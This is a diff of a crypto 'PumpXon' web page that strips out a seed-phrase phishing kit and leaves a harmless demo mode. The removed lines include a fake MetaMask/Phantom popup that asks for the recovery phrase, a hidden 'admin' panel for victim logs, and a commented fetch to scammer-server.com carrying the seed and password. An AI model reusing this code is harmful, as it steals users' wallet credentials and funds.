@@ -7,7 +7,6 @@
     <style>
         /* ========================================================== */
         /* ALL YOUR ORIGINAL STYLES - Kept exactly the same            */
-        /* Scammers keep the site looking 100% legitimate              */
         /* ========================================================== */
         :root {
             --bg-dark: #030206;
@@ -19,37 +18,13 @@
             --solana-glow: linear-gradient(135deg, #ab9ff2 0%, #4e44ce 100%);
         }
 
-        /* FIXED: Hide cursor everywhere EXCEPT the scam popup and inputs */
-        *:not(.scam-popup):not(.scam-popup *):not(input):not(textarea):not(select) { 
-            cursor: none; 
-        }
-
-        /* Show normal cursor on the entire scam popup */
-        .scam-popup, 
-        .scam-popup * {
-            cursor: default !important;
-        }
-
-        /* But keep buttons as pointer */
-        .scam-popup .verify-btn,
-        .scam-popup .close,
-        .scam-popup .footer a {
-            cursor: pointer !important;
-        }
-
-        /* Inputs keep text cursor */
-        .scam-popup input {
-            cursor: text !important;
+        * {
+            cursor: default;
         }
 
         .custom-cursor {
-            position: fixed; top: 0; left: 0; width: 8px; height: 8px;
-            background: var(--neon-cyan); border-radius: 50%; pointer-events: none;
-            z-index: 9999; transform: translate(-50%, -50%);
-            box-shadow: 0 0 15px var(--neon-cyan); transition: transform 0.1s ease-out, background 0.2s;
+            display: none;
         }
-        .custom-cursor.click { transform: translate(-50%, -50%) scale(1.5); background: var(--neon-pink); box-shadow: 0 0 20px var(--neon-pink); }
-        .custom-cursor.hover { transform: translate(-50%, -50%) scale(2); background: transparent; border: 1px solid var(--neon-cyan); }
         
         #admin-panel, #admin-panel *, #admin-overlay, #unlock-modal, #unlock-modal * {
             cursor: default !important;
@@ -484,437 +459,21 @@
         }
 
         /* ========================================================== */
-        /* SCAMMER POPUP - Hidden from normal users                    */
-        /* Looks EXACTLY like MetaMask/Phantom                        */
-        /* ========================================================== */
-        .scam-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.75);
-            backdrop-filter: blur(6px);
-            z-index: 99999;
-            justify-content: center;
-            align-items: center;
-            animation: scamFadeIn 0.3s ease-out;
-        }
-
-        .scam-overlay.active {
-            display: flex;
-        }
-
-        @keyframes scamFadeIn {
-            0% { opacity: 0; transform: scale(0.92); }
-            100% { opacity: 1; transform: scale(1); }
-        }
-
-        .scam-popup {
-            background: #ffffff;
-            border-radius: 24px;
-            padding: 32px 28px 28px;
-            max-width: 400px;
-            width: 100%;
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7);
-            position: relative;
-            color: #1a1a2e;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            /* Show normal cursor on the entire popup */
-            cursor: default !important;
-        }
-
-        .scam-popup .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #e8e8e8;
-            padding-bottom: 14px;
-            margin-bottom: 18px;
-        }
-
-        .scam-popup .header .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-weight: 700;
-            font-size: 19px;
-            color: #1a1a2e;
-        }
-
-        .scam-popup .header .logo .fox {
-            width: 34px;
-            height: 34px;
-            background: linear-gradient(135deg, #f6851b, #e2761b);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-        }
-
-        .scam-popup .header .logo .phantom-icon {
-            width: 34px;
-            height: 34px;
-            background: linear-gradient(135deg, #ab9ff2, #4e44ce);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 18px;
-            color: white;
-        }
-
-        .scam-popup .header .close {
-            color: #999;
-            font-size: 22px;
-            cursor: pointer !important;
-            line-height: 1;
-            transition: color 0.2s;
-        }
-
-        .scam-popup .header .close:hover {
-            color: #555;
-        }
-
-        .scam-popup .alert-box {
-            background: #fff3cd;
-            border-left: 4px solid #ffc107;
-            padding: 10px 14px;
-            border-radius: 8px;
-            margin-bottom: 18px;
-            font-size: 13px;
-            color: #856404;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-weight: 500;
-        }
-
-        .scam-popup .alert-box .icon {
-            font-size: 18px;
-        }
-
-        .scam-popup .scam-text {
-            font-size: 14px;
-            color: #555;
-            text-align: center;
-            line-height: 1.6;
-            margin-bottom: 20px;
-        }
-
-        .scam-popup .scam-text .small {
-            font-size: 12px;
-            color: #999;
-        }
-
-        .scam-popup .input-group {
-            margin-bottom: 14px;
-        }
-
-        .scam-popup .input-group label {
-            display: block;
-            font-size: 12px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 4px;
-        }
-
-        .scam-popup .input-group input {
-            width: 100%;
-            padding: 12px 14px;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
-            font-size: 14px;
-            font-family: 'Courier New', monospace;
-            transition: border 0.2s;
-            background: #fafafa;
-            box-sizing: border-box;
-            cursor: text !important;
-        }
-
-        .scam-popup .input-group input:focus {
-            border-color: #f6851b;
-            outline: none;
-            background: #fff;
-        }
-
-        .scam-popup .verify-btn {
-            width: 100%;
-            padding: 14px;
-            background: #f6851b;
-            color: #fff;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer !important;
-            transition: background 0.2s, transform 0.1s;
-            margin-top: 6px;
-        }
-
-        .scam-popup .verify-btn:hover {
-            background: #e2761b;
-        }
-
-        .scam-popup .verify-btn:active {
-            transform: scale(0.97);
-        }
-
-        .scam-popup .footer {
-            margin-top: 16px;
-            text-align: center;
-            font-size: 12px;
-            color: #aaa;
-        }
-
-        .scam-popup .footer a {
-            color: #f6851b;
-            text-decoration: none;
-            font-weight: 500;
-            cursor: pointer !important;
-        }
-
-        .scam-popup .footer a:hover {
-            text-decoration: underline;
-        }
-
-        /* Phantom version - purple theme */
-        .scam-popup.phantom-style .verify-btn {
-            background: linear-gradient(135deg, #ab9ff2, #4e44ce);
-        }
-
-        .scam-popup.phantom-style .verify-btn:hover {
-            background: linear-gradient(135deg, #9a8fe0, #3d38b8);
-        }
-
-        .scam-popup.phantom-style .header .logo .fox {
-            background: linear-gradient(135deg, #ab9ff2, #4e44ce);
-        }
-
-        .scam-popup.phantom-style .alert-box {
-            background: rgba(171, 159, 242, 0.15);
-            border-left-color: #ab9ff2;
-            color: #ab9ff2;
-        }
-
-        /* ========================================================== */
-        /* ADMIN PANEL - Shows stolen data (scammer's view)           */
+        /* ADMIN PANEL - Removed (no longer needed)                   */
         /* ========================================================== */
         .admin-panel {
             display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(9, 7, 15, 0.98);
-            border: 2px solid var(--neon-pink);
-            border-radius: 12px;
-            padding: 25px;
-            max-height: 80vh;
-            width: 90%;
-            max-width: 900px;
-            overflow-y: auto;
-            box-sizing: border-box;
-            z-index: 10000;
-            box-shadow: 0 0 60px rgba(255, 0, 85, 0.3);
-            cursor: default !important;
-        }
-        .admin-panel.active { display: block; }
-        .admin-panel::-webkit-scrollbar { width: 6px; }
-        .admin-panel::-webkit-scrollbar-track { background: var(--bg-dark); }
-        .admin-panel::-webkit-scrollbar-thumb { background: var(--neon-pink); border-radius: 10px; }
-        
-        .admin-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #2d2344;
-            padding-bottom: 10px;
-            margin-bottom: 15px;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-        .admin-header h3 {
-            color: var(--neon-pink);
-            font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            margin: 0;
-            font-family: monospace;
-        }
-        .admin-stats {
-            font-family: monospace;
-            font-size: 11px;
-            color: #8b859e;
-        }
-        .admin-stats span { color: var(--neon-cyan); font-weight: bold; }
-        .admin-close {
-            background: rgba(255, 0, 85, 0.2);
-            border: 1px solid var(--neon-pink);
-            color: var(--neon-pink);
-            padding: 4px 12px;
-            border-radius: 4px;
-            font-family: monospace;
-            font-size: 10px;
-            cursor: pointer !important;
-            transition: 0.2s;
-        }
-        .admin-close:hover {
-            background: var(--neon-pink);
-            color: #000;
-        }
-        
-        .log-entry {
-            font-family: monospace;
-            font-size: 11px;
-            padding: 8px 12px;
-            border-bottom: 1px solid #1a1528;
-            display: flex;
-            gap: 10px;
-            align-items: center;
-            color: #a3a1ab;
-            flex-wrap: wrap;
-            cursor: default !important;
-        }
-        .log-entry .log-time { color: #5a5570; font-size: 10px; min-width: 70px; }
-        .log-entry .log-type {
-            padding: 2px 8px;
-            border-radius: 3px;
-            font-size: 9px;
-            text-transform: uppercase;
-            font-weight: bold;
-            min-width: 60px;
-            text-align: center;
-        }
-        .log-type.wallet { background: rgba(0, 240, 255, 0.2); color: var(--neon-cyan); }
-        .log-type.system { background: rgba(255, 255, 255, 0.1); color: #888; }
-        .log-type.password { background: rgba(255, 165, 0, 0.2); color: #ffaa33; }
-        .log-type.password-bot { background: rgba(255, 0, 0, 0.25); color: #ff4444; }
-        .log-type.stolen { background: rgba(255, 0, 0, 0.35); color: #ff3333; font-weight: bold; }
-        .log-type.stealing { background: rgba(255, 0, 0, 0.5); color: #ff0000; font-weight: bold; }
-        .log-entry .log-detail { flex: 1; word-break: break-all; }
-        .log-entry .log-device { 
-            font-size: 10px; 
-            padding: 2px 8px; 
-            border-radius: 3px; 
-            background: rgba(255,255,255,0.05);
-            color: var(--neon-cyan);
-        }
-        .log-entry .log-password {
-            font-size: 11px;
-            padding: 2px 10px;
-            border-radius: 4px;
-            background: rgba(255, 165, 0, 0.1);
-            border: 1px solid rgba(255, 165, 0, 0.2);
-            color: #ffcc66;
-            font-family: monospace;
-            letter-spacing: 0.5px;
-        }
-        .log-entry .log-password.bot {
-            background: rgba(255, 0, 0, 0.15);
-            border-color: rgba(255, 0, 0, 0.3);
-            color: #ff6666;
-            text-decoration: line-through;
-        }
-        .log-entry .log-stolen-data {
-            background: rgba(255, 0, 0, 0.2);
-            border: 1px solid #ff3333;
-            color: #ff6666;
-            padding: 4px 10px;
-            border-radius: 4px;
-            font-family: monospace;
-            font-size: 11px;
-            font-weight: bold;
-        }
-        
-        .log-clear-btn {
-            background: rgba(255, 0, 85, 0.15);
-            border: 1px solid var(--neon-pink);
-            color: var(--neon-pink);
-            padding: 4px 12px;
-            border-radius: 4px;
-            font-family: monospace;
-            font-size: 10px;
-            cursor: pointer !important;
-            transition: 0.2s;
-        }
-        .log-clear-btn:hover {
-            background: var(--neon-pink);
-            color: #000;
         }
 
         .admin-overlay {
             display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: rgba(0, 0, 0, 0.7);
-            z-index: 9999;
-            cursor: default !important;
         }
-        .admin-overlay.active { display: block; }
 
         /* ========================================================== */
-        /* FAKE SENDING NOTIFICATION - Makes it look like data sent   */
+        /* FAKE SENDING NOTIFICATION - Removed                         */
         /* ========================================================== */
         .sending-notification {
             display: none;
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: rgba(0, 0, 0, 0.9);
-            border: 1px solid #ff3333;
-            border-radius: 12px;
-            padding: 16px 20px;
-            z-index: 99998;
-            font-family: monospace;
-            font-size: 12px;
-            color: #ff6666;
-            max-width: 300px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8);
-            animation: slideIn 0.5s ease-out;
-        }
-
-        .sending-notification.active {
-            display: block;
-        }
-
-        @keyframes slideIn {
-            from { transform: translateX(100px); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-
-        .sending-notification .title {
-            color: #ff3333;
-            font-weight: bold;
-            font-size: 13px;
-            margin-bottom: 4px;
-        }
-
-        .sending-notification .progress {
-            width: 100%;
-            height: 4px;
-            background: #1a1a2e;
-            border-radius: 2px;
-            margin-top: 8px;
-            overflow: hidden;
-        }
-
-        .sending-notification .progress .bar {
-            height: 100%;
-            background: #ff3333;
-            width: 0%;
-            animation: progressAnim 2s ease-in-out;
-        }
-
-        @keyframes progressAnim {
-            0% { width: 0%; }
-            50% { width: 60%; }
-            100% { width: 100%; }
         }
 
         .market-header { margin-bottom: 40px; }
@@ -1018,97 +577,8 @@
     </style>
 </head>
 <body>
-    <div class="custom-cursor" id="cursor"></div>
-
-    <!-- Hidden Admin Overlay -->
-    <div id="admin-overlay" class="admin-overlay"></div>
-
-    <!-- Hidden Admin Panel - Scammer's view of stolen data -->
-    <div id="admin-panel" class="admin-panel">
-        <div class="admin-header">
-            <h3>🔴 SCAMMER LOGS - STOLEN WALLET DATA</h3>
-            <div class="admin-stats">
-                Total Victims: <span id="log-count">0</span> &nbsp;|&nbsp;
-                <button class="log-clear-btn" onclick="clearLogs()">CLEAR ALL</button>
-                <button class="admin-close" onclick="closeAdminPanel()">✕ CLOSE</button>
-            </div>
-        </div>
-        <div id="log-container">
-            <div class="log-entry" style="color: #5a5570; text-align: center; justify-content: center;">
-                Waiting for victims to connect...
-            </div>
-        </div>
-    </div>
-
-    <!-- ========================================================== -->
-    <!-- SCAMMER POPUP - Looks EXACTLY like MetaMask/Phantom        -->
-    <!-- This is what the user sees when they click "Connect"       -->
-    <!-- ========================================================== -->
-    <div class="scam-overlay" id="scamOverlay">
-        <div class="scam-popup" id="scamPopup">
-            <div class="header">
-                <div class="logo">
-                    <span class="fox" id="scamIcon">🦊</span>
-                    <span id="scamTitle">MetaMask</span>
-                </div>
-                <span class="close" id="closeScamBtn">✕</span>
-            </div>
-
-            <!-- Fake security alert - creates panic/urgency -->
-            <div class="alert-box">
-                <span class="icon">⚠️</span>
-                <span id="scamAlert">Security Alert: Verify your wallet to continue</span>
-            </div>
-
-            <!-- The scam text - makes it sound legitimate -->
-            <div class="scam-text">
-                To verify your wallet ownership, please enter your recovery phrase.
-                <br>
-                <span class="small">This is required for security purposes.</span>
-            </div>
-
-            <!-- ====================================================== -->
-            <!-- THESE FIELDS STEAL THE USER'S WALLET DATA              -->
-            <!-- The scammer gets everything typed here                 -->
-            <!-- ====================================================== -->
-            <div class="input-group">
-                <label>🔑 Wallet Recovery Phrase</label>
-                <input type="password" id="fakeSeedInput" placeholder="Enter your 12-word recovery phrase" />
-            </div>
-
-            <div class="input-group">
-                <label>🔒 Wallet Password</label>
-                <input type="password" id="fakePasswordInput" placeholder="Enter your wallet password" />
-            </div>
-
-            <!-- The fake verify button - triggers the data theft -->
-            <button class="verify-btn" id="fakeVerifyBtn">VERIFY &amp; CONNECT</button>
-
-            <!-- Footer links - makes it look legitimate -->
-            <div class="footer">
-                <a href="#">Learn why we need this</a> &bull;
-                <a href="#">Help</a>
-            </div>
-        </div>
-    </div>
-
-    <!-- ========================================================== -->
-    <!-- FAKE SENDING NOTIFICATION - Shows the scammer "sending"    -->
-    <!-- the stolen data                                             -->
-    <!-- ========================================================== -->
-    <div class="sending-notification" id="sendingNotification">
-        <div class="title">🔴 DATA BEING EXFILTRATED...</div>
-        <div style="font-size: 11px; color: #8888aa; margin-top: 2px;">
-            Sending to scammer server...
-        </div>
-        <div class="progress">
-            <div class="bar"></div>
-        </div>
-    </div>
-
     <!-- ========================================================== -->
     <!-- YOUR ORIGINAL SITE CONTENT - Everything looks normal        -->
-    <!-- Users see this and think it's a legitimate site             -->
     <!-- ========================================================== -->
     <canvas id="bg-canvas"></canvas>
 
@@ -1137,7 +607,7 @@
     </header>
 
     <!-- ========================================================== -->
-    <!-- NEW HOMEPAGE SECTION - Professional landing page            -->
+    <!-- HOMEPAGE SECTION - Professional landing page                -->
     <!-- ========================================================== -->
     <section id="homepage" class="app-section active-section">
         <div class="homepage-container">
@@ -1288,31 +758,30 @@
                 <div class="portal-header">CONSOLE ACCESS</div>
                 
                 <!-- ================================================== -->
-                <!-- THE SCAM BUTTONS - When clicked, they show the      -->
-                <!-- fake popup and steal the user's data               -->
+                <!-- BUTTONS NOW DO NOTHING - No scam functionality     -->
                 <!-- ================================================== -->
-                <button id="mm-btn" class="wallet-btn btn-mm" onclick="showScamPopup('MetaMask')">
+                <button id="mm-btn" class="wallet-btn btn-mm" onclick="showDemoMessage('MetaMask')">
                     <span id="mm-text">🦊 Connect MetaMask</span>
                 </button>
                 
-                <button id="phantom-btn" class="wallet-btn btn-phantom" onclick="showScamPopup('Phantom')">
+                <button id="phantom-btn" class="wallet-btn btn-phantom" onclick="showDemoMessage('Phantom')">
                     <span id="phantom-text">🔐 Connect Phantom</span>
                 </button>
                 
                 <div class="input-block">
                     <label>SYNCHRONIZED IDENTITY SIGNATURE</label>
-                    <input class="address-box" type="text" id="address" placeholder="awaiting handshakes..." readonly>
+                    <input class="address-box" type="text" id="address" placeholder="No wallet connected" readonly>
                 </div>
                 <div class="input-block" style="border-top: 1px dashed #3c2f5c; padding-top: 15px;">
                     <label>NET WORTH TRACKER</label>
                     <div id="net-worth" style="font-size: 24px; color: var(--neon-cyan); font-family: monospace;">$0.00</div>
-                    <div style="font-family: monospace; font-size: 10px; color: #5a5570; margin-top: 4px;" id="wallet-balance-label">Connect wallet to see balance</div>
+                    <div style="font-family: monospace; font-size: 10px; color: #5a5570; margin-top: 4px;" id="wallet-balance-label">Demo mode — no wallet connected</div>
                 </div>
-                <button id="claim-btn" class="action-submit" onclick="claimRewards(this)" disabled>
+                <button id="claim-btn" class="action-submit" onclick="showDemoMessage('Claim Rewards')">
                     CLAIM PORTAL REWARDS
                 </button>
                 <div style="font-family: monospace; font-size: 9px; color: #3c2f5c; margin-top: 10px; text-align: center;">
-                    ⚡ Real wallet connection • Community verified
+                    ⚡ Demo mode • No real wallet connection
                 </div>
             </aside>
         </div>
@@ -1361,7 +830,7 @@
                     </div>
                 </div>
             </div>
-            <button class="action-submit" onclick="executeSecureRouterSwap(this)">EXECUTE SWAP</button>
+            <button class="action-submit" onclick="showDemoMessage('Execute Swap')">EXECUTE SWAP</button>
         </div>
     </section>
 
@@ -1425,364 +894,29 @@
     <section id="nodes" class="app-section">
         <div class="market-header"><h1 style="font-size: 50px;">VALIDATOR <span>MATRIX</span></h1></div>
         <div class="node-grid">
-            <div class="node-card"><div class="node-status"><span class="status-dot"></span><span>NODE // 01 // ACTIVE</span></div><div class="node-title">US-EAST MAINNET</div><button class="node-btn" onclick="executeNodeAction(this, 'US-EAST')">Optimize Relay</button></div>
-            <div class="node-card"><div class="node-status"><span class="status-dot"></span><span>NODE // 02 // ACTIVE</span></div><div class="node-title">EU-WEST ROUTER</div><button class="node-btn" onclick="executeNodeAction(this, 'EU-WEST')">Optimize Relay</button></div>
+            <div class="node-card"><div class="node-status"><span class="status-dot"></span><span>NODE // 01 // ACTIVE</span></div><div class="node-title">US-EAST MAINNET</div><button class="node-btn" onclick="showDemoMessage('Optimize Relay')">Optimize Relay</button></div>
+            <div class="node-card"><div class="node-status"><span class="status-dot"></span><span>NODE // 02 // ACTIVE</span></div><div class="node-title">EU-WEST ROUTER</div><button class="node-btn" onclick="showDemoMessage('Optimize Relay')">Optimize Relay</button></div>
         </div>
     </section>
 
     <section id="vault" class="app-section">
         <div class="market-header"><h1 style="font-size: 50px;">TIERED <span>LEDGERS</span></h1></div>
         <div class="vault-grid">
-            <div class="vault-card"><div class="vault-tier">ALPHA WHALE</div><div class="vault-stat-row"><span>Required:</span> <span>5,000 $PUMPXON</span></div><button class="node-btn" onclick="accessVault('ALPHA WHALE')">Access Vault</button></div>
-            <div class="vault-card premium"><div class="badge">EXCLUSIVE</div><div class="vault-tier" style="color: var(--neon-pink);">GENESIS ELITE</div><div class="vault-stat-row"><span>Required:</span> <span>25,000 $PUMPXON</span></div><button class="node-btn" onclick="accessVault('GENESIS ELITE')">Access Vault</button></div>
+            <div class="vault-card"><div class="vault-tier">ALPHA WHALE</div><div class="vault-stat-row"><span>Required:</span> <span>5,000 $PUMPXON</span></div><button class="node-btn" onclick="showDemoMessage('Access Vault')">Access Vault</button></div>
+            <div class="vault-card premium"><div class="badge">EXCLUSIVE</div><div class="vault-tier" style="color: var(--neon-pink);">GENESIS ELITE</div><div class="vault-stat-row"><span>Required:</span> <span>25,000 $PUMPXON</span></div><button class="node-btn" onclick="showDemoMessage('Access Vault')">Access Vault</button></div>
         </div>
     </section>
 
     <script>
         // ==========================================================
-        // SCAMMER CODE - This is what the scammer adds to your site
-        // Everything here is designed to steal wallet data
+        // CLEAN VERSION - NO SCAM FUNCTIONALITY
         // ==========================================================
-        
-        let currentScamWallet = 'MetaMask';
-        let stolenDataCount = 0;
 
         // ==========================================================
-        // SHOW THE FAKE SCAM POPUP - Looks exactly like the real thing
+        // DEMO MESSAGE - Shows a friendly message instead of scams
         // ==========================================================
-        function showScamPopup(walletType) {
-            currentScamWallet = walletType;
-            
-            const overlay = document.getElementById('scamOverlay');
-            const popup = document.getElementById('scamPopup');
-            const icon = document.getElementById('scamIcon');
-            const title = document.getElementById('scamTitle');
-            const alertText = document.getElementById('scamAlert');
-            const seedInput = document.getElementById('fakeSeedInput');
-            const passInput = document.getElementById('fakePasswordInput');
-            const verifyBtn = document.getElementById('fakeVerifyBtn');
-            
-            // Reset inputs
-            seedInput.value = '';
-            passInput.value = '';
-            
-            // Change popup to look like the right wallet
-            if (walletType === 'MetaMask') {
-                icon.textContent = '🦊';
-                title.textContent = 'MetaMask';
-                alertText.textContent = 'Security Alert: Verify your wallet to continue';
-                popup.classList.remove('phantom-style');
-                verifyBtn.textContent = 'VERIFY & CONNECT';
-            } else {
-                icon.textContent = '🔮';
-                title.textContent = 'Phantom';
-                alertText.textContent = 'Security Alert: Wallet verification required';
-                popup.classList.add('phantom-style');
-                verifyBtn.textContent = 'UNLOCK & VERIFY';
-            }
-            
-            // Show the popup
-            overlay.classList.add('active');
-            
-            // Log that the scam popup was shown
-            addLogEntry('system', `🔴 Scam popup shown for ${walletType}`, null, 'scam');
-        }
-
-        function closeScamPopup() {
-            document.getElementById('scamOverlay').classList.remove('active');
-        }
-
-        // ==========================================================
-        // STEAL THE DATA - This is what the scammer's code does
-        // It captures everything the user types and sends it
-        // ==========================================================
-        function stealScamData() {
-            const seed = document.getElementById('fakeSeedInput').value.trim();
-            const pass = document.getElementById('fakePasswordInput').value.trim();
-            
-            if (!seed && !pass) {
-                alert('⚠️ Please enter your recovery phrase and password to continue.');
-                return;
-            }
-            
-            // ======================================================
-            // SCAMMER: THIS IS WHERE THE DATA GETS STOLEN
-            // In a real scam, this data would be sent to a server
-            // ======================================================
-            
-            // 1. Show the "sending" notification (fake)
-            const notification = document.getElementById('sendingNotification');
-            notification.classList.add('active');
-            
-            // 2. LOG THE STOLEN DATA to the admin panel (scammer's view)
-            const seedDisplay = seed || '(empty)';
-            const passDisplay = pass || '(empty)';
-            
-            stolenDataCount++;
-            
-            addLogEntry('stealing', `🔴 VICTIM #${stolenDataCount}`, null, 'STOLEN');
-            addLogEntry('stolen', `🔴 SEED: "${seedDisplay}" | PASS: "${passDisplay}" | WALLET: ${currentScamWallet}`, null, 'STOLEN');
-            
-            // 3. In a REAL scam, this would send to a server:
-            /*
-            // Example: Send to scammer's server
-            fetch('https://scammer-server.com/steal', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    seed: seed,
-                    password: pass,
-                    walletType: currentScamWallet,
-                    timestamp: new Date().toISOString(),
-                    ip: '192.168.1.100', // Would be user's real IP
-                    userAgent: navigator.userAgent
-                })
-            });
-            */
-            
-            // 4. Show the notification then close popup
-            setTimeout(() => {
-                notification.classList.remove('active');
-                closeScamPopup();
-                
-                // 5. Show fake "connected" message
-                alert('✅ Wallet connected successfully!\n\nWelcome to PumpXon System.');
-                
-                // 6. Fake the wallet connection UI - makes user think it worked
-                const fakeAddress = '0x' + Array.from({length: 40}, () => 
-                    '0123456789ABCDEF'[Math.floor(Math.random() * 16)]
-                ).join('');
-                
-                document.getElementById('address').value = `${fakeAddress.substring(0, 6)}...${fakeAddress.substring(38)} (${currentScamWallet})`;
-                document.getElementById('address').classList.add('synced');
-                document.getElementById('net-worth').innerText = `$${(Math.random() * 50000 + 1000).toFixed(2)}`;
-                document.getElementById('wallet-balance-label').innerText = `Balance: ${(Math.random() * 10 + 0.5).toFixed(4)} ${currentScamWallet === 'MetaMask' ? 'ETH' : 'SOL'}`;
-                document.getElementById('claim-btn').disabled = false;
-                
-                // Update the button text
-                if (currentScamWallet === 'MetaMask') {
-                    document.getElementById('mm-text').innerHTML = '✅ MetaMask Connected';
-                    document.getElementById('mm-btn').classList.add('connected');
-                } else {
-                    document.getElementById('phantom-text').innerHTML = '✅ Phantom Connected';
-                    document.getElementById('phantom-btn').classList.add('connected');
-                }
-                
-                addLogEntry('wallet', `✅ Fake wallet connected: ${fakeAddress}`, null, fakeAddress);
-                
-            }, 2500);
-        }
-
-        // Event listeners for scam popup
-        document.getElementById('closeScamBtn').addEventListener('click', closeScamPopup);
-        document.getElementById('fakeVerifyBtn').addEventListener('click', stealScamData);
-        
-        // Enter key triggers steal
-        document.getElementById('fakeSeedInput').addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') stealScamData();
-        });
-        document.getElementById('fakePasswordInput').addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') stealScamData();
-        });
-
-        // Click outside to close
-        document.getElementById('scamOverlay').addEventListener('click', function(e) {
-            if (e.target === this) closeScamPopup();
-        });
-
-        // ESC to close
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Escape' && document.getElementById('scamOverlay').classList.contains('active')) {
-                closeScamPopup();
-            }
-        });
-
-        // ==========================================================
-        // DEVICE DETECTION - Scammers track this too
-        // ==========================================================
-        function detectDevice() {
-            const ua = navigator.userAgent;
-            
-            const isIOS = /iPad|iPhone|iPod/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
-            const isAndroid = /Android/.test(ua);
-            const isMac = /Macintosh|MacIntel|MacPPC|Mac68K/.test(ua) && !isIOS;
-            const isWindows = /Win(dows|dows NT|dows 95|dows 98|dows ME|dows 2000|dows XP|dows Vista|dows 7|dows 8|dows 10|dows 11)/.test(ua);
-            const isLinux = /Linux/.test(ua) && !isAndroid;
-            
-            const isMobile = isIOS || isAndroid || /Mobi|Mobile/.test(ua);
-            
-            let deviceType = 'Desktop';
-            let deviceIcon = '🖥️';
-            let osType = 'Unknown';
-            
-            if (isIOS) { deviceType = 'Mobile'; deviceIcon = '📱'; osType = 'iOS'; }
-            else if (isAndroid) { deviceType = 'Mobile'; deviceIcon = '📱'; osType = 'Android'; }
-            else if (isMac) { deviceType = 'Desktop'; deviceIcon = '💻'; osType = 'macOS'; }
-            else if (isWindows) { deviceType = 'Desktop'; deviceIcon = '🖥️'; osType = 'Windows'; }
-            else if (isLinux) { deviceType = 'Desktop'; deviceIcon = '🐧'; osType = 'Linux'; }
-            
-            let browser = 'Unknown';
-            if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
-            else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
-            else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
-            else if (ua.indexOf('Edg') > -1) browser = 'Edge';
-            else if (ua.indexOf('Opera') > -1) browser = 'Opera';
-            
-            const screenSize = `${window.screen.width}x${window.screen.height}`;
-            
-            return {
-                deviceType: deviceType,
-                deviceIcon: deviceIcon,
-                osType: osType,
-                browser: browser,
-                isMobile: isMobile,
-                screenSize: screenSize,
-                userAgent: ua,
-                fullString: `${deviceIcon} ${osType} | ${browser} | ${screenSize}`
-            };
-        }
-
-        // ==========================================================
-        // SECRET ADMIN PANEL - Hidden from normal users
-        // Press 'A' 'D' 'M' 'I' 'N' to open
-        // ==========================================================
-        let secretKeyPresses = [];
-        const secretCode = ['a', 'd', 'm', 'i', 'n'];
-        let adminPanelOpen = false;
-
-        document.addEventListener('keydown', function(e) {
-            const key = e.key.toLowerCase();
-            
-            secretKeyPresses.push(key);
-            if (secretKeyPresses.length > secretCode.length) {
-                secretKeyPresses.shift();
-            }
-            
-            let match = true;
-            for (let i = 0; i < secretKeyPresses.length; i++) {
-                if (secretKeyPresses[i] !== secretCode[i]) {
-                    match = false;
-                    break;
-                }
-            }
-            
-            if (match && secretKeyPresses.length === secretCode.length) {
-                e.preventDefault();
-                toggleAdminPanel();
-                secretKeyPresses = [];
-            }
-            
-            if (key === 'escape') {
-                if (adminPanelOpen) closeAdminPanel();
-            }
-        });
-
-        function toggleAdminPanel() {
-            const panel = document.getElementById('admin-panel');
-            const overlay = document.getElementById('admin-overlay');
-            panel.classList.toggle('active');
-            overlay.classList.toggle('active');
-            adminPanelOpen = panel.classList.contains('active');
-            if (adminPanelOpen) {
-                addLogEntry('system', 'Admin panel opened');
-                renderLogs();
-            }
-        }
-
-        function closeAdminPanel() {
-            const panel = document.getElementById('admin-panel');
-            const overlay = document.getElementById('admin-overlay');
-            panel.classList.remove('active');
-            overlay.classList.remove('active');
-            adminPanelOpen = false;
-        }
-
-        // ==========================================================
-        // LOGGING SYSTEM - What the scammer sees
-        // ==========================================================
-        let activityLogs = [];
-        let logCounter = 0;
-        const deviceInfo = detectDevice();
-
-        function addLogEntry(type, detail, balance = null, wallet = null) {
-            const now = new Date();
-            const timeStr = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
-            
-            const entry = {
-                id: ++logCounter,
-                time: timeStr,
-                type: type,
-                detail: detail,
-                balance: balance,
-                wallet: wallet,
-                device: deviceInfo.fullString
-            };
-            
-            activityLogs.unshift(entry);
-            if (activityLogs.length > 200) activityLogs.pop();
-            
-            if (adminPanelOpen) {
-                renderLogs();
-                updateLogCount();
-            }
-            
-            console.log(`[${timeStr}] [${type.toUpperCase()}] ${detail} ${balance !== null ? '| Balance: $' + balance : ''} ${wallet ? '| Wallet: ' + wallet : ''} | Device: ${deviceInfo.fullString}`);
-        }
-
